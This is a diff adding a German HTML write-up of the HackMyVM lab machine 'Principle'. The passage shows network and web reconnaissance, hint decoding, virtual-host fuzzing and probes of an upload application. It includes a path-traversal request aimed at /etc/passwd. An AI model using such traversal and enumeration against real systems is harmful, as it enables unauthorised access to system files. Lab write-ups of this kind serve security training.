@@ -1,0 +1,1164 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Principle - HackMyVM - Bericht</title> <!-- Angepasst an Quelle -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Principle - HackMyVM - Level: Medium - Bericht</h1> <!-- Angepasst an Quelle -->
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">whereis</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">printf</div>
+                <div class="tool-item">whoami</div> <!-- Implied by root prompt -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (RCE via File Upload)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.127	08:00:27:28:6f:33	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk gescannt. Es wird ein aktiver Host unter der IP <span class="command">192.168.2.127</span> mit der MAC-Adresse <span class="command">08:00:27:28:6f:33</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Principle" wurde erfolgreich im lokalen Netzwerk lokalisiert. Die IP <span class="command">192.168.2.127</span> ist die Basis für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP notieren. Als nächstes Portscans (Nmap) durchführen, um offene Dienste zu finden und mit der Web-Enumeration beginnen.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann ARP-Scans eindämmen. Überwachung auf ungewöhnliche ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[Inhalt /etc/hosts nach Bearbeitung]
+127.0.0.1	localhost
+<span class="command">192.168.2.127   principle.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei des Angreifer-Systems wird bearbeitet, um den Hostnamen `principle.hmv` der gefundenen IP-Adresse <span class="command">192.168.2.127</span> zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um das Zielsystem über seinen Hostnamen ansprechen zu können, was für Web-Scans und die Interaktion mit Webanwendungen oft erforderlich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardvorgehen. Sicherstellen, dass die Zuordnung korrekt ist. Später gefundene VHosts ebenfalls hier eintragen.<br><strong>Empfehlung (Admin):</strong> Aktion auf dem Angreifer-System. Keine direkte serverseitige Maßnahme.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nikto -h 192.168.2.127</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.127
++ Target Hostname:    192.168.2.127
++ Target Port:        80
++ Start Time:         2023-07-27 16:21:32 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.22.1</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /robots.txt: Entry '<span class="command">/hi.html</span>' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '<span class="command">/investigate/</span>' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ <span class="command">/robots.txt</span>: contains 3 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ <span class="command">/#wp-config.php#</span>: #wp-config.php# file found. This file contains the credentials. <span class="password">&lt;-- Falsch-Positiv? Oder Hinweis?</span>
++ 8105 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2023-07-27 16:21:49 (GMT2) (17 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um einen grundlegenden Webserver-Scan auf Port 80 durchzuführen. Es identifiziert den Server als <span class="command">nginx/1.22.1</span>, meldet fehlende Security Header (<span class="command">X-Frame-Options</span>, <span class="command">X-Content-Type-Options</span>), findet eine <span class="command">robots.txt</span> mit interessanten Einträgen (<span class="command">/hi.html</span>, <span class="command">/investigate/</span>) und meldet einen potenziellen Fund einer WordPress-Konfigurationsdatei (<span class="command">#wp-config.php#</span>), was aber ungewöhnlich formatiert ist und ein False Positive sein könnte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert wichtige erste Hinweise: Nginx als Webserver, fehlende Sicherheitsheader (geringes Risiko, aber gute Praxis), und vor allem die Existenz einer `robots.txt`, die auf potenziell interessante Pfade hinweist. Der Fund `/#wp-config.php#` sollte mit Vorsicht betrachtet werden, könnte aber auf eine versteckte oder fehlerhafte WordPress-Installation hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die `robots.txt` und die darin genannten Pfade `/hi.html` und `/investigate/`. Überprüfen Sie den Fund bezüglich `wp-config.php` manuell. Führen Sie umfassendere Scans mit Nmap und Directory Bustern durch.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security Header (X-Frame-Options: DENY/SAMEORIGIN, X-Content-Type-Options: nosniff). Überprüfen Sie den Inhalt der `robots.txt`, um sicherzustellen, dass keine sensiblen Pfade versehentlich preisgegeben werden. Stellen Sie sicher, dass keine Backup- oder Konfigurationsdateien (wie `wp-config.php#`) im Web-Root liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.127 -p- | grep open</span></div>
+                     <pre><span class="command">80/tcp open  http    nginx 1.22.1</span></pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.127 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 16:21 CEST
+Nmap scan report for principle.hmv (192.168.2.127)
+Host is up (0.00019s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    nginx 1.22.1</span>
+| http-robots.txt: 1 disallowed entry
+|_<span class="command">/hackme</span>
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.22.1
+MAC Address: <span class="command">08:00:27:28:6F:33</span> (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms principle.hmv (192.168.2.127)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS` SYN-Scan, `-sC` Standard-Skripte, `-sV` Versionserkennung, `-T5` Aggressives Timing, `-A` OS-Erkennung, Skript-Scan, Traceroute, `-p-` alle Ports) wird auf das Ziel durchgeführt. Der `grep open`-Befehl filtert nur den offenen Port heraus, der anschließende vollständige Nmap-Befehl zeigt alle Details. Es wird nur Port <span class="command">80 (HTTP)</span> als offen identifiziert, auf dem <span class="command">nginx 1.22.1</span> läuft. Die Nmap-Skripte extrahieren den `Disallow`-Eintrag <span class="command">/hackme</span> aus der `robots.txt` und bestätigen den Server-Header und den Seitentitel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan bestätigt die Ergebnisse von Nikto (Nginx auf Port 80) und liefert zusätzliche Details wie den `Disallow`-Eintrag `/hackme` aus der `robots.txt`. Das Fehlen anderer offener Ports (wie SSH) ist bemerkenswert, schränkt aber die Angriffsfläche auf den Webserver ein. Die OS-Erkennung deutet auf einen Linux-Kernel (4.x/5.x) hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die weiteren Bemühungen auf den Webserver (Port 80). Untersuchen Sie die von Nikto und Nmap identifizierten Pfade (`/hi.html`, `/investigate/`, `/hackme`). Führen Sie intensive Verzeichnis- und VHost-Enumeration durch.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie Nginx und das Betriebssystem aktuell. Überprüfen Sie den `Disallow`-Eintrag `/hackme` - ist dieser Pfad tatsächlich nicht erreichbar oder enthält er versteckte Informationen?</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">gobuster dir -u http://principle.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[+] Url:                     http://principle.hmv
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/X.Y.Z
+[+] Extensions:              [Liste der 29 Erweiterungen]
+[+] Expanded:                true
+[+] No error logging:        true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://principle.hmv/robots.txt</span>           (Status: 200) [Size: 68]
+<span class="command">http://principle.hmv/hi.html</span>              (Status: 200) [Size: 141]
+<span class="command">http://principle.hmv/investigate</span>          (Status: 200) [Size: 812] &lt;-- Implizit gefunden, da index.html existiert
+<span class="command">http://principle.hmv/investigate/index.html</span> (Status: 200) [Size: 812]
+<span class="command">http://principle.hmv/investigate/rainbow_mystery.txt</span> (Status: 200) [Size: 596]
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan wird gestartet, um Verzeichnisse und Dateien auf `http://principle.hmv` zu finden. Eine sehr umfangreiche Liste von Dateiendungen (`-x`) wird verwendet, und Statuscodes 403 (Forbidden) und 404 (Not Found) werden ignoriert (`-b`). `-e` zeigt die volle URL, `--no-error` unterdrückt Verbindungsfehler. Der Scan findet die bereits bekannte `robots.txt` und `hi.html` sowie das Verzeichnis `/investigate` mit einer `index.html` und einer `rainbow_mystery.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt die Funde aus Nikto/Nmap und deckt zusätzlich die `rainbow_mystery.txt` im `/investigate`-Verzeichnis auf. Die umfangreiche Liste an Erweiterungen war hier nicht unbedingt nötig, zeigt aber Gründlichkeit. Das Ignorieren von 403/404 ist Standard.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt aller gefundenen Dateien (`robots.txt`, `hi.html`, `investigate/index.html`, `investigate/rainbow_mystery.txt`), um weitere Hinweise oder Schwachstellen zu finden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine unnötigen oder sensiblen Dateien über das Web zugänglich sind. Konfigurieren Sie den Webserver, um Directory Listing zu verhindern (falls nicht bereits geschehen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Manuelle Analyse der gefundenen Dateien</span></div>
+                    <pre>
+<span class="command">http://principle.hmv/robots.txt</span>
+User-agent: *
+Allow: /hi.html
+Allow: /investigate
+Disallow: /hackme
+
+<span class="command">http://principle.hmv/hi.html</span>
+- Who I am?
+- You are a automaton
+- Are you sure?
+- Yep
+- Thank you, who has created me?
+- They say Elohim
+
+<span class="command">http://principle.hmv/investigate/index.html</span>
+The mystery of Talos
+Talos
+In Greek mythology, Talos was a giant automaton made of bronze which protected
+Europa in Crete from pirates and invaders. He was known to be a gift given to
+Europa by Zeus himself.
+&lt;!-- If you like research, I will try to help you to solve the enigmas,
+     try to search for documents in this directory --&gt;
+
+<span class="command">http://principle.hmv/investigate/rainbow_mystery.txt</span>
+QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
+[...]
+LS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0gLi4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
+
+<span class="command">http://principle.hmv/hackme</span>
+404 Not Found
+nginx/1.22.1
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Inhalte der zuvor gefundenen Webdateien werden dargestellt.
+            *   `robots.txt`: Bestätigt die erlaubten/verbotenen Pfade.
+            *   `hi.html`: Enthält einen Dialog über einen Automaten namens "Elohim".
+            *   `investigate/index.html`: Spricht von "Talos", einem bronzenen Automaten, und enthält einen HTML-Kommentar, der zum Suchen nach Dokumenten im Verzeichnis auffordert.
+            *   `investigate/rainbow_mystery.txt`: Enthält Base64-kodierten Text.
+            *   `/hackme`: Liefert wie erwartet einen 404-Fehler.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Analyse liefert mehrere Hinweise: Die Namen "Elohim" und "Talos" scheinen wichtig zu sein. Der Kommentar in `index.html` bestätigt, dass das `/investigate`-Verzeichnis relevant ist. Die `rainbow_mystery.txt` enthält verschlüsselten/kodierten Text, der wahrscheinlich wichtige Informationen birgt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dekodieren Sie den Base64-Text aus `rainbow_mystery.txt`. Untersuchen Sie den dekodierten Text auf weitere Hinweise, insbesondere auf den Morsecode am Ende.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Kommentare oder Hinweise aus öffentlich zugänglichen Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">curl http://principle.hmv/investigate/rainbow_mystery.txt | base64 -d</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   596  100   596    0     0   401k      0 --:--:-- --:--:-- --:--:--  582k
+According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
+Maybe that's why I am a robot?
+Maybe that is why I am alone in this world?
+
+The answer is here:
+<span class="command">-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `rainbow_mystery.txt` wird mit `curl` heruntergeladen und durch `base64 -d` dekodiert. Der dekodierte Text enthält eine narrative Passage und endet mit einer Zeile Morsecode: <span class="command">-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-</span></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Base64-kodierte Text wurde erfolgreich dekodiert. Der Morsecode ist der nächste wichtige Hinweis, der entschlüsselt werden muss.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie einen Online-Morsecode-Übersetzer oder ein Skript, um die Nachricht <span class="command">-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-</span> zu dekodieren. Das Ergebnis wird wahrscheinlich ein Hostname oder eine Domain sein.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensible Informationen oder Hinweise in öffentlich zugänglichen Dateien zu verstecken, auch nicht durch einfache Kodierung wie Base64 oder Morsecode.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Manuelle Dekodierung / Online-Tool</span></div>
+                    <pre>
+Morse: -.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
+Übersetzung: DOMAIN / T4L0S.HMV  <span class="password">&lt;-- Das '/' ist wahrscheinlich ein Trennzeichen, nicht Teil des Namens</span>
+
+Ergibt: <span class="command">T4L0S.hmv</span>
+</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Aktualisierung der /etc/hosts</span></div>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[Inhalt /etc/hosts nach Bearbeitung]
+127.0.0.1	localhost
+<span class="command">192.168.2.127   principle.hmv principle.T4L0S.hmv T4L0S.hmv</span> <span class="password">&lt;-- Hinzugefügt: T4L0S.hmv, principle.T4L0S.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Morsecode wird als <span class="command">DOMAIN / T4L0S.HMV</span> interpretiert, was auf den Domain-/Hostnamen <span class="command">T4L0S.hmv</span> hindeutet. Daraufhin wird die `/etc/hosts`-Datei erneut bearbeitet, um `T4L0S.hmv` und vorsichtshalber auch `principle.T4L0S.hmv` der Ziel-IP <span class="command">192.168.2.127</span> zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Entschlüsselung des Hinweises und korrekte Vorbereitung für die Untersuchung des neuen potenziellen VHosts <span class="command">T4L0S.hmv</span>.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, `http://T4L0S.hmv` im Browser aufzurufen. Führen Sie VHost-Enumeration durch, um mögliche Subdomains von `T4L0S.hmv` zu finden (z.B. `FUZZ.T4L0S.hmv`).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Testaufruf des neuen VHosts</span></div>
+                     <pre>http://principle.hmv/T4L0S.HMV  <span class="password">&lt;-- Falscher Pfad, sollte http://T4L0S.hmv sein</span>
+
+404 Not Found
+nginx/1.22.1</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, auf `http://principle.hmv/T4L0S.HMV` zuzugreifen. Dies ist syntaktisch falsch; es hätte `http://T4L0S.hmv` (als Hostname, nicht als Pfad) sein sollen. Der resultierende 404-Fehler ist daher erwartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Test war nicht korrekt durchgeführt. Es muss der Hostname selbst, nicht ein Pfad unter `principle.hmv`, aufgerufen werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Aufruf auf `http://T4L0S.hmv`. Beginnen Sie mit der VHost-Enumeration für `T4L0S.hmv`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://principle.hmv" -H "Host: FUZZ.T4L0S.hmv" --hc 400,401,402,403,404 --hh 615</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://principle.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="command">000080313:   200        51 L     174 W      1659 Ch     "hellfire"</span>                   
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114440
+Requests/sec.: 0
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird zur VHost-Enumeration für die Domain `T4L0S.hmv` verwendet. `-u "http://principle.hmv"` gibt die Ziel-IP (über den bekannten Hostnamen) an. `-H "Host: FUZZ.T4L0S.hmv"` setzt den Host-Header dynamisch mit Subdomains (`FUZZ`) aus der Wortliste. `--hc 400,401,402,403,404` ignoriert typische Fehlercodes. `--hh 615` blendet Antworten mit 615 Zeichen aus (vermutlich die Standard-"Welcome to nginx"-Seite).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Es wurde eine Subdomain <span class="command">hellfire</span> gefunden, die zu `hellfire.T4L0S.hmv` führt und eine andere Antwort (1659 Chars) liefert als die Standardseite.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `hellfire.T4L0S.hmv` zur `/etc/hosts`-Datei hinzu. Rufen Sie `http://hellfire.T4L0S.hmv` im Browser auf und beginnen Sie mit der Enumeration dieser neuen Webanwendung (Directory Busting, Technologieerkennung).<br><strong>Empfehlung (Admin):</strong> Sichern Sie alle Subdomains ab, auch interne oder versteckte. Verwenden Sie keine leicht erratbaren Namen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Manuelle Analyse von hellfire.T4L0S.hmv (impliziert)</span></div>
+                    <pre>
+Gefundene Pfade auf http://hellfire.T4L0S.hmv:
+<span class="command">http://hellfire.T4L0S.hmv/index.php</span>            (Status: 200) [Size: 1659]
+<span class="command">http://hellfire.T4L0S.hmv/upload.php</span>           (Status: 200) [Size: 748]
+<span class="command">http://hellfire.T4L0S.hmv/output.php</span>           (Status: 200) [Size: 1350]
+<span class="command">http://hellfire.T4L0S.hmv/archivos</span>             (Status: 301) [Size: 169] [--> http://hellfire.t4l0s.hmv/archivos/]
+
+Inhalt von http://hellfire.t4l0s.hmv/index.php:
+[elohim@principle ~]$ echo "Road to $HOME, but you don't
+have access to the System.
+
+You should not look for the way, you have been warned."
+Road to /gehenna, but you don't have access to the System.
+You should not look for the way, you have been warned.
+
+[ASCII Art Terminal]
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Analyse des neuen VHosts `hellfire.T4L0S.hmv` (vermutlich durch Directory Busting wie `gobuster dir` oder `dirb`, obwohl nicht explizit gezeigt) ergibt drei PHP-Dateien (`index.php`, `upload.php`, `output.php`) und ein Verzeichnis `/archivos`. Der Inhalt von `index.php` zeigt eine Shell-ähnliche Ausgabe des Benutzers `elohim` auf `principle`, die auf ein Verzeichnis `/gehenna` hinweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung auf `hellfire.T4L0S.hmv` scheint interaktiv zu sein oder Shell-Befehle zu simulieren. Die `upload.php` ist ein besonders interessantes Ziel für potenzielle Dateiupload-Schwachstellen. Der Hinweis auf `/gehenna` könnte ein Home-Verzeichnis oder ein Flag-Verzeichnis sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Funktionalität von `upload.php` und `output.php`. Versuchen Sie, Dateien (insbesondere PHP-Shells) über `upload.php` hochzuladen. Prüfen Sie, ob `/archivos` Uploads enthält oder beschreibbar ist. Untersuchen Sie, ob `output.php` eine LFI- oder RCE-Schwachstelle aufweist.<br><strong>Empfehlung (Admin):</strong> Sichern Sie Dateiupload-Funktionen rigoros ab (Typ-, Größen-, Namensvalidierung, Speicherung außerhalb des Web-Roots oder mit nicht-interpretierbaren Berechtigungen). Sichern Sie alle Skripte gegen LFI/RCE ab.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Versuche, Schwachstellen zu finden</span></div>
+                     <pre>
+Versuchter Zugriff auf nicht existierende Datei im Upload-Verzeichnis:
+http://hellfire.t4l0s.hmv/archivos/testben.php.jpeg
+404 Not Found
+nginx/1.22.1
+
+Versuch LFI über upload.php (Parameter 'archivo'):
+GET /upload.php?archivo=../../../../../../etc/passwd HTTP/1.1
+[Ergebnis nicht gezeigt, vermutlich fehlgeschlagen]
+
+Parameter-Fuzzing für output.php:
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://hellfire.t4l0s.hmv/output.php?FUZZ=id" --hc 400,401,402,403,404 --hh 1348
+Target: http://hellfire.t4l0s.hmv/output.php?FUZZ=id
+[...]
+<span class="command">000014831:   200        61 L     115 W      1429 Ch     "archivo"</span>
+
+Test von output.php mit gefundenem Parameter 'archivo':
+http://hellfire.t4l0s.hmv/output.php?archivo=whoami   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; nichts passiert &gt;&gt;&gt;&gt;&gt;&gt;
+
+Hinweis in einer Bilddatei (vermutlich im /archivos Verzeichnis gefunden):
+http://hellfire.t4l0s.hmv/archivos/testben.png
+&lt;!-- You're on the right track, he's getting angry! --&gt;
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es werden verschiedene Versuche unternommen, Schwachstellen in der Anwendung auf `hellfire.t4l0s.hmv` zu finden:
+            1.  Zugriff auf eine nicht existierende Datei im `/archivos`-Verzeichnis schlägt fehl (404).
+            2.  Ein LFI-Versuch über `upload.php` (Parameter `archivo`) wird angedeutet, scheint aber fehlgeschlagen zu sein.
+            3.  Parameter-Fuzzing für `output.php` mit `wfuzz` identifiziert erfolgreich den Parameter <span class="command">archivo</span>.
+            4.  Ein Versuch, RCE über `output.php?archivo=whoami` zu erreichen, schlägt fehl ("nichts passiert").
+            5.  In einer Bilddatei (`testben.png`) im `/archivos`-Verzeichnis wird ein HTML-Kommentar gefunden, der den Pentester ermutigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> LFI/RCE-Versuche über die URL-Parameter scheinen nicht direkt erfolgreich zu sein. Der Fokus verlagert sich wieder auf `upload.php` und das `/archivos`-Verzeichnis. Der Kommentar in der Bilddatei bestätigt, dass dies der richtige Weg ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die `upload.php`. Versuchen Sie, eine PHP-Webshell hochzuladen. Analysieren Sie, wie die Anwendung Uploads verarbeitet (Dateinamen, Speicherort, Filter). Prüfen Sie, ob hochgeladene Dateien über `/archivos/` zugänglich sind.<br><strong>Empfehlung (Admin):</strong> Dateiuploads sicher implementieren. Keine aufmunternden Kommentare in Produktionsdateien hinterlassen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">dirb http://hellfire.t4l0s.hmv -X .php,.txt</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+[...]
+---- Scanning URL: http://hellfire.t4l0s.hmv/ ----
++ <span class="command">http://hellfire.t4l0s.hmv/index.php</span> (CODE:200|SIZE:1659)
++ <span class="command">http://hellfire.t4l0s.hmv/output.php</span> (CODE:200|SIZE:1350)
